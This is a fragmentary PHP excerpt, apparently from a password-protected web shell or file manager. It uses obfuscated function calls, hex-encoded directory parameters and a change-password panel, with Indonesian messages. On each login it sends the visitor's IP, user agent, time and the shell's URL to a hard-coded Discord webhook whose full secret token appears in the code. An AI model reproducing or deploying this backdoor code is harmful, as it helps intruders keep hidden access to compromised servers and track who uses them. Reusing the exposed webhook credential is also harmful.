...
function getUserAgentDetails($user_agent) {
...
$user_agent_details = getUserAgentDetails($user_agent);
    $link = getCurrentUrl();

$webhook_url = 'https://discord.com/api/webhooks/1286360299338993704/N2oYGIfDjC-LWYSgL15GsWeOVHMOBjGIXpb6cxRk-T1LKgSS33Dc952s0yoFHzozkpLp';
...
if (!isset($_SESSION['authenticated'])) {
    ...
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        ...
        $message = [
            'username' => 'Login Notification',
            'content' => "New login detected!\n\n" .
                        "IP Address: $user_ip\n" .
                        "Date and Time: $login_date_time\n" .
                        "User Agent: $user_agent_details\n" .
                        "Full User Agent: $user_agent\n" .
                        "Link: $link"
        ];
         ...
         <div class="tool-menu-header">
            <div class="list-tool">
                <ul class="tool-menu">
                    ...
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&lock=change-password" class=""><i class="fa-solid fa-lock"></i></i>&nbsp;Change Password</a></li>
...
?>
    ...
    <?php endif; ?>
    <?php if ($_GET['lock'] == "change-password") : ?>
        <div class="create">
            <div class="modal">
                <header>
                ...
                <form method="POST">
                  ...
                  <input type="submit" class="btn-modal" name="change_password" value="Change Password">
                  <a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a>
                </form>
            </div>
        </div>
    <?php endif; ?>
...
if (isset($_SESSION['authenticated'])) {
      if (isset($_POST['change_password'])) {
          if (password_verify($_POST['current_pass'], $stored_hashed_password)) {
              $new_hashed_password = password_hash($_POST['new_pass'], PASSWORD_DEFAULT);

              file_put_contents($file_path, $new_hashed_password);
              $redirect_url = strtok($_SERVER["REQUEST_URI"], '?');
              echo "<script>alert('Password berhasil berubah'); window.location.href='" . $redirect_url . "'</script>";
          } else {
